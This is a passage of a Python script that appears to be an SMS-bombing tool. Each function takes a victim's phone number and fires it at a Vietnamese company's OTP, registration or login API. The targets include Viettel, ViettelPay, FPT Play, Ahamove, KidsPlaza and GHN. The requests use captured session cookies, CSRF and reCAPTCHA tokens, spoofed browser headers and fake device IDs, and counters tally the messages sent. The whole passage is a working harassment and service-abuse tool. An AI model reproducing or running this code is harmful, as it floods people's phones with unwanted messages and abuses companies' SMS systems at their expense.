    response = requests.post('https://api.popeyes.vn/api/v1/register', cookies=cookies, headers=headers, json=json_data)
    thanhcong+=1
#sms 43
def sms20(phone):
    global thanhcong
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN',
        'BrandCode': 'ALFRESCOS',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'DNT': '1',
        'DeviceCode': 'web',
        'Origin': 'https://alfrescos.com.vn',
        'Referer': 'https://alfrescos.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'culture': 'vi-VN',
    }

    json_data = {
        'phoneNumber': phone,
        'secureHash': '753d977024f8d805306e5078ad25a00a',
        'deviceId': '',
        'sendTime': 1703860383205,
        'type': 1,
    }

    response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params=params, headers=headers, json=json_data)
    thanhcong+=1

#sms 44
def sms21(phone):
    global thanhcong
    requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone[1:11]})).text
    thanhcong+=1
#sms 48
def sms22(phone):
    global thanhcong
    headers = {
        'authority': 'api.fptplay.net',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://fptplay.vn',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-did': 'ABF6AD8B2ACE7D0E',
    }

    json_data = {
        'phone': phone,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    response = requests.post(
        'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=CUZ-KiJXaLMJ7FszwK_Zrw&e=1703864126&device=Chrome(version%253A120.0.0.0)&drm=1',
        headers=headers,
        json=json_data,
    )
    thanhcong+=1
#sms49
def sms23(phone):
    global thanhcong
    headers = {
        'authority': 'api.ahamove.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://app.ahamove.com',
        'referer': 'https://app.ahamove.com/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    json_data = {
        'mobile': phone[1:9],
        'name': 'hoang',
        'email': 'bohoangdz@gmail.com',
        'country_code': 'VN',
        'firebase_sms_auth': 'true',
        'time': 1703860692,
        'checksum': 'H5orYHI463TcARZHf6xyU/lyv4+lx3w68FS1zNXx0Cx9gaj2npSXuh2aKSCVfR44cTSPPumj1ECww4Rlvn7hcEYP4RtrY8JZicv4ZPpWnxxyvS3NOuyPxOo64PatsAf8+dnEn09D0llQoq8FlD6tQfZ06bn9b5Ug1ZRakqndxdA4D4Y03bcXeraizM7P5EHkNzMebCIjOxANDSh8ODEqLBhmgKrkKSZT2Nl3ObWPQuhY0dO5xp7zW4zaBNbkD+JlvyewhsD9mN4pPxoambo2LfpXwDQthi04i/UKqEy+QtoM0bVkYypsUA1QiFvt+tKSSPf2C1qCJv5xJqUYehjiUg==',
    }

    response = requests.post('https://api.ahamove.com/api/v3/public/user/register', headers=headers, json=json_data)
    thanhcong+=1
#sms 52
def sms24(phone):
    global thanhcong
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
    thanhcong +=1
#sms 55
def sms25(phone):
    global thanhcong
    global thatbai
    headers = {
        'authority': 'www.kidsplaza.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json',
        'cookie': 'PHPSESSID=kinglbn5spravi3luvaatgs3jp; __Secure-API_SESSION=kinglbn5spravi3luvaatgs3jp; cdp_customerIdentify=1; _gcl_au=1.1.687785078.1703860922; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; _gcl_aw=GCL.1703860929.CjwKCAiA-bmsBhAGEiwAoaQNmgcF7QjCtXC0oVUR6tR1trfoIm6IB2LRFOvYfhoUbSdCSUBBKJlssRoC6sEQAvD_BwE; _atm_objs=eyJzb3VyY2UiOiJnb29nbGUiLCJtZWRpdW0iOiJjcGMiLCJjYW1wYWlnbiI6ImFkd29yZHMiLCJj%0D%0Ab250ZW50IjoiYWR3b3JkcyIsInRlcm0iOiJhZHdvcmRzIiwidHlwZSI6ImFzc29jaWF0ZV91dG0i%0D%0ALCJjaGVja3N1bSI6IioiLCJ0aW1lIjoxNzAzODYwOTI5NzQzfQ%3D%3D; _pk_ref.564990546.fc16=%5B%22%22%2C%22%22%2C1703860930%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.564990546.fc16=*; form_key=HjN8YsX4Mj1p9W9E; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; form_key=HjN8YsX4Mj1p9W9E; _fbp=fb.1.1703860934946.540016440; _ga=GA1.1.1236270977.1703860935; _cdp_cfg=1; _cdp_fsid=3752649465283696; _asm_visitor_type=n; _ac_au_gt=1703860933843; _tt_enable_cookie=1; _ttp=IifvYCxKQHopLZQZnGf5XzcMpUz; _asm_uid=1380356661; store=hcm; private_content_version=updated-658edad32e5e12.60064562; X-Magento-Vary=e46423ae947909f49073dd3d5e74aa7e8975e2be; _asm_ss_view=%7B%22time%22%3A1703860935474%2C%22sid%22%3A%223752649465283696%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222023-12-29T14%3A42%3A46%22%2C%22duration%22%3A30994%7D; _ga_T93VCQ3ZQS=GS1.1.1703860935.1.1.1703860967.28.0.0; _pk_id.564990546.fc16=1380356661.1703860930.1.1703860983.1703860930.; _ac_client_id=1380356661.1703860983; _ac_an_session=zgzkzmzhzlznzqznzlzmzhzrzgzlzqzlzdzizgzrzjzgzmzlzlzlzizdzizkzjzgzrzlzjzqzrzgzdzizdzizkzjzgzrzlzjzqzrzgzdzizkzjzgzrzlzjzqzrzgzdzizdzhzlzdzhzd2f27zdzgzdzlzmzlzkzjzd; au_id=1380356661; section_data_ids=%7B%22customer%22%3A1703861934%2C%22cart%22%3A1703861970%2C%22shipping_address_selected%22%3A1703861972%2C%22messages%22%3Anull%2C%22compare-products%22%3Anull%2C%22last-ordered-items%22%3Anull%2C%22directory-data%22%3Anull%2C%22captcha%22%3Anull%2C%22instant-purchase%22%3Anull%2C%22persistent%22%3Anull%2C%22review%22%3Anull%2C%22wishlist%22%3Anull%2C%22faq%22%3Anull%2C%22ammessages%22%3Anull%2C%22rewards%22%3Anull%2C%22ins%22%3Anull%2C%22custom_address_local_storage_data%22%3Anull%2C%22recently_viewed_product%22%3Anull%2C%22recently_compared_product%22%3Anull%2C%22product_data_storage%22%3Anull%2C%22paypal-billing-agreement%22%3Anull%7D',
        'dnt': '1',
        'origin': 'https://www.kidsplaza.vn',
        'referer': 'https://www.kidsplaza.vn/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'data': {
            'password': 'Qưert1234',
            'confirm_password': 'Qưert1234',
            'phone': phone,
            'email': 'caobaquat@gmail.com',
            'name': 'cao qua quat',
            'website_id': '2',
            'g_recaptcha_response': '03AFcWeA75cAjgxMNMOL5LbmcYAhxTdK2QLb3HgQ96S8MbpbVFLlCj5-U4AGBKZBg3PEyDyCw1gp1wmsGpeiEVKZ3wmLAkySQAhE_v-on0nHF1-ypoucOAVp9QS8X7J9EFxUuo2bQ1Iysa7OgVxzQ9jRz4JZ3SLHtjmjjl0UoYYrBFBamdaUvCZrRNw9HjuIyPQJrxXuCsL4Bw0FpqSaRAHrsF4aP4mMV7azfBII4n6foFEjbV5v9hyYtRkwj_vvwIBV2PpI9rtcI1zy2e0cnlONPVCO3pSIdBpnU6b1Q45RiCU8PZ5YHxQNzYQDNhdOW8SDKBV7PBjB_rk4puJ-EjuAa8xih2TfGpXkIxPV_B4MXshMiUYOGK6kAW1jtC06Ai49Sv2xAbyl_sJZ9kyPYCLmPUigyUhZfDTk6wzf1FTxbi9IwZ5Y69zkkIdI3E6cGK-QYPKl8NY9EQhgtKRSp-VcdGLIpanU1EmTeeuXn_q1EK-fxvN4rTJtGgwo4--UP2_kA2lk3Cygn3uFIZNnB_7YtlaeMvA-QQWJdjXM7R9frcK3KdxbIhkCKxw8xCMSYbc9wbIw-6vbUuUVoMM7vQNkmRb-Klu5tewPi9uOItwDiYmXQLBjW7ucTjvv63sZ_ZPYtAVmOc4iNMvJ3mi2k1XO7zYmZp7pNm2b47vzUIh-fmpOjDarghErGglilfy1U5grW_HV1scyhp5lWrSLhyQ9a_n3cxBCkqoRCeFv3rdco7KotOV1u1BfON_xHLeAGrbgpOybT62N0hjcFS8RElTEf8pddtQ-jz0EqfuP5N1kOi-6g4lY9bggZJ09bbJkdGXb1VmVLrlOAOTCgqW_0cAA7HqOXjpM3Nqtp9sp8IifvCpp_1nKHaACNyJca4Nla-ftROHVnHxLxq656pZws_7tEBBZzhkCuC_8x7Q_tJ_vfNLPDY13TY-Ep-jd9YM-hYxU-RnBidA8BJ4FvJjEVBLH9i7TKKO-quVZWIVRSY8o5xbymism17BCtpfZztjfC8q2_S2D5_EPWgkojMlfBkeeg3rlTnioP4NeGA1DE9cV-GP9_vpDcVGz1dg7wMbSKt59vw4yKnJX75fypBTAVgVrVyrvWRYF9fNBalVWQ6wu7ie_XpaCiOXVAys6UPl6lYsiJadvDJerYmRF58IJKSASUnunNZxN5zg-NGZvfu_ozzvRhrdlcvhc3Lm5xfN-uVT-GQfC0lg7yc30IOAMMVvjEGKA-XcJaGxq3Uw4ITikUSQRmr1u_PgoTV6qdxnYFaB9xV_sGMVT6z8P2SrSaUM4VWOL-SBZCbk7Mf2HOZYjxhglDwDJBt2DV2dgYNR-ApXpsNCjZwqnAzDGGH56XIX6Y7kk75C-C9aIHdErlX1ee3t6Pif8ZRcitngOrXMz_duyNPFKLVY78ZmBslhJJXJ_ywhh-P4tqxrDDlhYK1m_bwMwo4iWTYK2J92yTaX6c0cxg-TBYE0eAYZiscCvmxBf7egqpp6dMnFiS7f9JqFa8_lrG6gaFlaSrU9Q5hR77GbD9LO6eRLM68k1EE4APjUs9faxlhQ4z1rmB9b66HMab9Ug_dllDWSM9TUKTQOuJj4qoLmmD2bZAJ',
        },
    }

    response = requests.post(
        'https://www.kidsplaza.vn/rest/hcm/V1/customer/account/register/on-web',
        headers=headers,
        json=json_data,
    )
    thanhcong+=1
#sms 56
def sms26(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_ga': 'GA1.1.1751329135.1703861100',
        '_fbp': 'fb.1.1703861102777.176529727',
        '_ga_5KHZV6MD4J': 'GS1.1.1703861100.1.0.1703861109.0.0.0',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        # 'Cookie': '_ga=GA1.1.1751329135.1703861100; _fbp=fb.1.1703861102777.176529727; _ga_5KHZV6MD4J=GS1.1.1703861100.1.0.1703861109.0.0.0',
        'DNT': '1',
        'Origin': 'https://id.icankid.vn',
        'Referer': 'https://id.icankid.vn/auth',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'content-type': 'application/json',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'challenge_code': '5b9005fe63325e396605b903a880358e7918d9f62c42dfb5c707116318164dfd',
        'challenge_method': 'SHA256',
        'recaptcha_response': '03AFcWeA4KZqSQejuSnmkm5NLHnv2jrAlew4hLmnOMiDH7mZ20TfbdLgvb_iFXbQm9i8qccALnN2RayQRVgWM_EJlfStQ4-r6SEBkVOkBHRMiJjNJsa4ghuX8I48UKvE9r1BiEJ3_BBgRuBKN_s-X7vFt231Gis2cK9lbjOzt0x2MHWcEAfP6ixjN3-5fPL9ogloWRillgHqIgRk2F761fzfwgOH0ymjm0umHxZaRULHoegWjdoB3vXllk1DYhYo-y4xSxn7tq_e9OwVC2xIGjLtO5vR94BioeIrsr368CkZItqFTFmGKqcI12Dkr558aeR1CWoCt6ihiDDR8eoN1o68A4TOFA_TVu0VrCmmME-MrE1QI5ItocnoJaxcO5RKFFsIu1QYqtpX-N3cHQuP6P9phnMNmyVY8H5H_xSiTnceAA0CUlsAn9eubQHIlUPY_ok_IXLmAZ-iFOVMVv3AvRErpnHHAoLsdLyGRhysIk7ZNtpMh57e5tlTHezJr7CPpO7rchUDdM2mEnBD-bJPyMNtNyxe3LieCMvG32okTXvGjLbA6wcLiCIzwT6c5RtHFMqvq_FYfSTvOiKQITguDNWw3xR9SQT2RcJwbZh4JehwoYmakYj190l8EJ-_PiiknxDi2LhSp1FhRCObX0js7Sl-vfaHVrXRgPOF38gc_RRRfLBnT8g7jszvM8DdKfwY10l5lxaBW18j1hSWwpnZDDRlyKhn_TOqusm2e-XQbE-a1V26Ft3_QJfzL4Y9Eo2PQgrW7LKuPYCot9lWiX6QexWV5GNL4rNWt6mXQMJFCgoAlfmyrQey5tbv44eeFZOzWOZWy2OLedVy5bLwMh5TqOFowZ3yTPIt0NWVb005ElpX5NGKyLjSRKUlXSiuNTWSW6bNYPyZr3FcVpA5ONSrc0F4Ctl7HydtGF2KmULQVI8UWp73IqVL8E5HJGuKToPzRkZjNRXlvRerXacSb2bLiXioMR6KG6rtNpoRbgPu1GjH8v79BRXNFb9SZu1ADx0Sy-u00_CjeYuRj5gp32PprtOcj8BuMKaHdd9K2cAh9aXOvleES73qk3UlOodXrJa6apbj6PFpUtYE5qE3NaAENYz1rp6-NQ89FHR7KJ3OSnLZqcASGp7ba0gt-nsNXyr7qR-Dieg2alljtOzSYfF0F3_c2UMSnMjWTu65pKyPzLmBDr0KFIGvbrqd_kcdfpDdQIL2-4uCkZ_9DDomACMTIYtq9kCVh_XWW8iPEkMuwCDHACBFA7VO5SPMYYb7uMoqj90lQ0fTFI364lvYzvHXKlaU97Zng-XOJRS-dGlSyu0ceDi5iZqd1BiivlIConTRvFPvDEVvEDK2IILpeS8zx9LFInmTainw8CmU65quBQkM7bir8UG7hvL4-Aa940kxuiTB1SbAkVl_4y0LPoMZ_DHMGNp9CS_jDNr5IatcFICb-g67g_U2J1uJC44SigbOjuMIQSMqZjTk1iIa4vzCKThBeb-3ncif1We_ASXy8xuTQUc_w_zpp-bzL2F-jYi86omdge49GNQbr28gM6Sq57sSjjH6GJ0YyVVygaWO8mi9gkhyYmriG_xZiHJRK3Eco-Z3SBNHewpWCp',
    }

    response = requests.post('https://id.icankid.vn/api/otp/challenge/', cookies=cookies, headers=headers, json=json_data)
    thanhcong+=1
#sms 58
def sms27(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_ym_uid': '1693617049750570465',
        '_ym_d': '1693617049',
        '_hjSessionUser_1750246': 'eyJpZCI6IjVhOGE0OGI2LTM5YTktNTY5ZC1hNTJmLTlhMjc0ZDFmMjE4MiIsImNyZWF0ZWQiOjE2OTM2MTcwNTA1OTYsImV4aXN0aW5nIjpmYWxzZX0=',
        'tts-utm-source': 'googlese',
        'tts_analytics_guest_id': 'v6xJVO1mOf6mRnBcj9dMa',
        'XSRF-TOKEN': 'ogjtKPLiRqRYXapEbaRp479KQzXMMNTGEDVcaBG1',
        'laravel_session': 'NPhgjHtQLS9zTjkcXagKiBHeH1NggSzio48tN1mz',
        '_gcl_au': '1.1.869912624.1703861253',
        '_ga': 'GA1.1.1625249642.1703861258',
        'NPS_81d9bd77_last_seen': '1703861258680',
        '_hjSessionUser_1638305': 'eyJpZCI6IjM1YzcxMzNiLTRkM2EtNWQ3MC1hMTVhLThlODA5NTFmOTQ0YSIsImNyZWF0ZWQiOjE3MDM4NjEyNjI1NzAsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_1638305': '0',
        '_hjSession_1638305': 'eyJpZCI6ImQ1ZWZhMjk5LTI2ZjMtNGU2My04MTJlLTRiNWI0Mzc4NmE0YyIsImMiOjE3MDM4NjEyNjI1ODQsInMiOjAsInIiOjAsInNiIjowfQ==',
        '_fbp': 'fb.1.1703861263674.583644751',
        '_ga_W85LP5ZTQK': 'GS1.1.1703861258.1.1.1703861266.52.0.0',
        '_ym_isad': '1',
        '_ym_visorc': 'w',
        'tts_notify_request': 'true',
    }

    headers = {
        'authority': 'thitruongsi.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json',
        # 'cookie': '_ym_uid=1693617049750570465; _ym_d=1693617049; _hjSessionUser_1750246=eyJpZCI6IjVhOGE0OGI2LTM5YTktNTY5ZC1hNTJmLTlhMjc0ZDFmMjE4MiIsImNyZWF0ZWQiOjE2OTM2MTcwNTA1OTYsImV4aXN0aW5nIjpmYWxzZX0=; tts-utm-source=googlese; tts_analytics_guest_id=v6xJVO1mOf6mRnBcj9dMa; XSRF-TOKEN=ogjtKPLiRqRYXapEbaRp479KQzXMMNTGEDVcaBG1; laravel_session=NPhgjHtQLS9zTjkcXagKiBHeH1NggSzio48tN1mz; _gcl_au=1.1.869912624.1703861253; _ga=GA1.1.1625249642.1703861258; NPS_81d9bd77_last_seen=1703861258680; _hjSessionUser_1638305=eyJpZCI6IjM1YzcxMzNiLTRkM2EtNWQ3MC1hMTVhLThlODA5NTFmOTQ0YSIsImNyZWF0ZWQiOjE3MDM4NjEyNjI1NzAsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_1638305=0; _hjSession_1638305=eyJpZCI6ImQ1ZWZhMjk5LTI2ZjMtNGU2My04MTJlLTRiNWI0Mzc4NmE0YyIsImMiOjE3MDM4NjEyNjI1ODQsInMiOjAsInIiOjAsInNiIjowfQ==; _fbp=fb.1.1703861263674.583644751; _ga_W85LP5ZTQK=GS1.1.1703861258.1.1.1703861266.52.0.0; _ym_isad=1; _ym_visorc=w; tts_notify_request=true',
        'dnt': '1',
        'origin': 'https://thitruongsi.com',
        'referer': 'https://thitruongsi.com/user/register',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
        'x-xsrf-token': 'ogjtKPLiRqRYXapEbaRp479KQzXMMNTGEDVcaBG1',
    }

    json_data = {
        'account_phone': phone,
        'recaptcha_token': '03AFcWeA7v381xRFe3ivbZ6DLZhSCCy-7BXHn8peQLvLsMjhj0gqDLgsPXXn7aMZmjv60dFtXtKwev15IXaOG3Y_ZjsvojTeWHjmgFGw5GfvbMyXCAwTWQCYNLd3kbHpFMr4EyPb-97Nz4C4UF3tBfGm-W32Qq7AnTZdxKiy-W_hQ559telE03X6dcy6TKa7ucbDiXMzir5coCZewqj8pgzNP_4nwex-4WPfVTN_FPiX_ri89IJXis30eau37mXEdm-dcz3tS_lkCz5OZaDthG_zTDzxQhw4QhGGrMdawvC_A9Y8ltN1XoU1YsDjl864Jo2cuQ6JnVJ2GS4jkE17dkrPqBOlI1xYUu3CTv7eUypbccX3685-mAN_GYtZv5Loja3Yv1B7Pec8c6yasF2DiL_SoKB24tD6eTzfo2sWI4euVy2lJiWHlSO0H6K1MOSFMuyISzJevJqTKD_1Rsq351gU76F9mOJ6SVuF0HCRZddIlYgfCsZyOgGL88MZZZjNlArXN871ALM6eBsUwnPcxraflCmlZJ2wEa66EjRuAVH1HUp9EOtW4R4B-xQMFXAOEhLOlG1fpR8b6kF21UbzE00iwWhROOE8XUXA',
    }

    response = requests.post(
        'https://thitruongsi.com/endpoint/v1/user/api/v4/users/register/step1-phone',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    thanhcong+=1
#sms 59
def sms28(phone):
    global thanhcong
    global thatbai
    link = 'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber=' + phone
    response = requests.post(link)
    thanhcong+=1
#sms 61
def sms61(phone):
    global thanhcong
    global thatbai
    headers = {
        "Host": "api8.viettelpay.vn",
        "product": "VIETTELPAY",
        "accept-language": "vi",
        "authority-party": "APP",
        "channel": "APP",
        "type-os": "android",
        "app-version": "5.1.4",
        "os-version": "10",
        "imei": "VTP_" + generate_random_string(32),
        "x-request-id": "20230803164512",  # Replace with the current date and time in the format "YmdHis"
        "content-type": "application/json; charset=UTF-8",
        "user-agent": "okhttp/4.2.2"
    }

    data = {
        "type": "msisdn",
        "username": phone
    }

    response = requests.post("https://api8.viettelpay.vn/customer/v1/validate/account", json=data, headers=headers, verify=False)
    get_data = response.json()

    if get_data["status"]["code"] == "CS9901":
        data = {
            "hash": "",
            "identityType": "msisdn",
            "identityValue": phone,
            "imei": "VTP_" + generate_random_string(32),
            "notifyToken": "",
            "otp": "android",
            "pin": "VTP_" + generate_random_string(32),
            "transactionId": "",
            "type": "REGISTER",
            "typeOs": "android",
            "verifyMethod": "sms"
        }
        response = requests.post("https://api8.viettelpay.vn/customer/v2/accounts/register", json=data, headers=headers, verify=False)
        get_data = response.json()
    else:
        data = {
            "imei": "VTP_" + generate_random_string(32),
            "loginType": "BASIC",
            "msisdn": phone,
            "otp": "",
            "pin": "VTP_" + generate_random_string(32),
            "requestId": "",
            "typeOs": "android",
            "userType": "msisdn",
            "username": phone
        }
        response = requests.post("https://api8.viettelpay.vn/auth/v1/authn/login", json=data, headers=headers, verify=False)
        get_data = response.json()

    if "Cần xác thực bổ sung OTP" in get_data["status"]["message"] or "Vui lòng nhập mã OTP được gửi về SĐT " + phone + " để xác minh chính chủ" in get_data["status"]["message"]:
        thanhcong+=1
    else:
        thatbai+=1
def sms29(phone):
    global thanhcong
    global thatbai
    headers = {
        'authority': 'online-gateway.ghn.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'access-control-request-headers': 'content-type',
        'access-control-request-method': 'POST',
        'origin': 'https://sso.ghn.vn',
        'referer': 'https://sso.ghn.vn/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    response = requests.options('https://online-gateway.ghn.vn/sso/public-api/v2/client/checkexistphone', headers=headers)


    headers = {
        'authority': 'online-gateway.ghn.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://sso.ghn.vn',
        'referer': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'type': 'register',
    }

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
    if 'true' in response.text:
        thanhcong+=1
    else:
        thatbai+=1

def sms30(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_gcl_au': '1.1.612062991.1693832247',
        '_ga': 'GA1.2.2100968570.1693832247',
        '_gid': 'GA1.2.823438155.1693832247',
        '_tt_enable_cookie': '1',
